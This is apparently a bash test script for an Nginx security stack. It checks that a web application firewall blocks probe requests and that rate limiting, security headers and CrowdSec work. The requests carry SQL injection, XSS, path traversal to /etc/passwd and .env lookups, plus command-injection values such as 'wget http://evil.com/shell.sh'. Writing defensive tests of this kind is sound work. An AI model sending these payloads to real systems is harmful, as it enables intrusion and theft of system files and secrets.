#!/bin/bash

# ===========================================
# Nginx Security Stack - Security Tests
# ===========================================
# Tests that attacks are properly blocked

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
HOST="${1:-localhost}"
PROTOCOL="${2:-http}"
BASE_URL="${PROTOCOL}://${HOST}"

echo "===== NGINX SECURITY STACK - SECURITY TESTS ====="
echo ""
echo "Target: ${BASE_URL}"
echo "Date: $(date)"
echo ""

PASSED=0
FAILED=0
WARNINGS=0

# Helper function to test and report
test_block() {
    local name="$1"
    local url="$2"
    local expected="$3"
    local method="${4:-GET}"

    if [ "$method" == "POST" ]; then
        RESULT=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" -k 2>/dev/null)
    else
        RESULT=$(curl -s -o /dev/null -w "%{http_code}" "$url" -k 2>/dev/null)
    fi

    if [[ "$expected" == *"$RESULT"* ]]; then
        echo -e "${GREEN}[PASS]${NC} $name - Got $RESULT (expected: $expected)"
        ((PASSED++))
    else
        echo -e "${RED}[FAIL]${NC} $name - Got $RESULT (expected: $expected)"
        ((FAILED++))
    fi
}

echo "--- 1. SQL Injection Tests ---"
test_block "Basic SQL Injection (OR)" "${BASE_URL}/?id=1' OR '1'='1" "403"
test_block "SQL Injection (UNION SELECT)" "${BASE_URL}/?id=1 UNION SELECT * FROM users" "403"
test_block "SQL Injection (DROP TABLE)" "${BASE_URL}/?q='; DROP TABLE users;--" "403"
test_block "SQL Injection (INSERT)" "${BASE_URL}/?data='; INSERT INTO users VALUES(1,'admin');--" "403"
echo ""

echo "--- 2. XSS Tests ---"
test_block "Basic XSS (script tag)" "${BASE_URL}/?q=<script>alert(1)</script>" "403"
test_block "XSS (javascript:)" "${BASE_URL}/?url=javascript:alert(1)" "403"
test_block "XSS (onerror)" "${BASE_URL}/?img=<img onerror=alert(1)>" "403"
test_block "XSS (onclick)" "${BASE_URL}/?a=<a onclick=alert(1)>" "403"
echo ""

echo "--- 3. Command Injection Tests ---"
test_block "Command Injection (;cat)" "${BASE_URL}/?cmd=;cat /etc/passwd" "403"
test_block "Command Injection (|)" "${BASE_URL}/?cmd=|ls -la" "403"
test_block "Command Injection (wget)" "${BASE_URL}/?cmd=wget http://evil.com/shell.sh" "403"
test_block "Command Injection (curl)" "${BASE_URL}/?cmd=curl http://evil.com/backdoor" "403"
echo ""

echo "--- 4. Path Traversal Tests ---"
test_block "Path Traversal (../)" "${BASE_URL}/../../../etc/passwd" "400|403|404"
test_block "Path Traversal (..\\)" "${BASE_URL}/..\\..\\..\\etc\\passwd" "400|403|404"
test_block "Path Traversal (URL encoded)" "${BASE_URL}/%2e%2e%2f%2e%2e%2fetc/passwd" "403|404"
test_block "Path Traversal (double encoded)" "${BASE_URL}/%252e%252e%252f" "403|404"
echo ""

echo "--- 5. Sensitive File Access Tests ---"
test_block "Hidden file (.env)" "${BASE_URL}/.env" "403|404"
test_block "Git directory" "${BASE_URL}/.git/config" "403|404"
test_block "Hidden file (.htaccess)" "${BASE_URL}/.htaccess" "403|404"
test_block "Package.json" "${BASE_URL}/package.json" "403|404"
test_block "Sensitive dir (node_modules)" "${BASE_URL}/node_modules/lodash/package.json" "403|404"
echo ""

echo "--- 6. Null Byte Injection Test ---"
test_block "Null byte injection" "${BASE_URL}/file.txt%00.jpg" "403|404"
echo ""

echo "--- 7. Rate Limiting Tests ---"
echo "Testing rate limiting on /api/auth/verify-otp (3 req/min limit)..."
echo -n "Requests: "
RATE_LIMITED=0
for i in {1..6}; do
    RESULT=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/api/auth/verify-otp" -k 2>/dev/null)
    echo -n "$RESULT "
    if [ "$RESULT" == "429" ]; then
        RATE_LIMITED=1
    fi
done
echo ""
if [ "$RATE_LIMITED" == "1" ]; then
    echo -e "${GREEN}[PASS]${NC} Rate limiting triggered (429 returned)"
    ((PASSED++))
else
    echo -e "${YELLOW}[WARN]${NC} Rate limiting may not be working (no 429 seen)"
    ((WARNINGS++))
fi
echo ""

echo "--- 8. Security Headers Test ---"
echo "Checking security headers..."
HEADERS=$(curl -sI "${BASE_URL}/" -k 2>/dev/null)

check_header() {
    local header="$1"
    if echo "$HEADERS" | grep -qi "$header"; then
        echo -e "${GREEN}[PASS]${NC} $header header present"
        ((PASSED++))
    else
        echo -e "${YELLOW}[WARN]${NC} $header header missing"
        ((WARNINGS++))
    fi
}

check_header "X-Frame-Options"
check_header "X-Content-Type-Options"
check_header "X-XSS-Protection"
check_header "Referrer-Policy"
check_header "Content-Security-Policy"
echo ""

echo "--- 9. Health Check Test ---"
RESULT=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/healthz" -k 2>/dev/null)
if [ "$RESULT" == "200" ]; then
    echo -e "${GREEN}[PASS]${NC} Health check returned 200"
    ((PASSED++))
else
    echo -e "${RED}[FAIL]${NC} Health check failed (got $RESULT)"
    ((FAILED++))
fi
echo ""

echo "--- 10. CrowdSec Status ---"
if docker ps 2>/dev/null | grep -q crowdsec; then
    DECISIONS=$(docker exec crowdsec cscli decisions list -o json 2>/dev/null | jq length 2>/dev/null || echo "0")
    echo -e "${GREEN}[INFO]${NC} CrowdSec running, active decisions: $DECISIONS"
else
    echo -e "${YELLOW}[WARN]${NC} CrowdSec container not running or not accessible"
    ((WARNINGS++))
fi
echo ""

echo "===== TEST SUMMARY ====="
echo -e "Passed:   ${GREEN}$PASSED${NC}"
echo -e "Failed:   ${RED}$FAILED${NC}"
echo -e "Warnings: ${YELLOW}$WARNINGS${NC}"
echo ""

if [ "$FAILED" -gt 0 ]; then
    echo -e "${RED}Some security tests failed! Review the results above.${NC}"
    exit 1
else
    echo -e "${GREEN}All security tests passed!${NC}"
    exit 0
fi
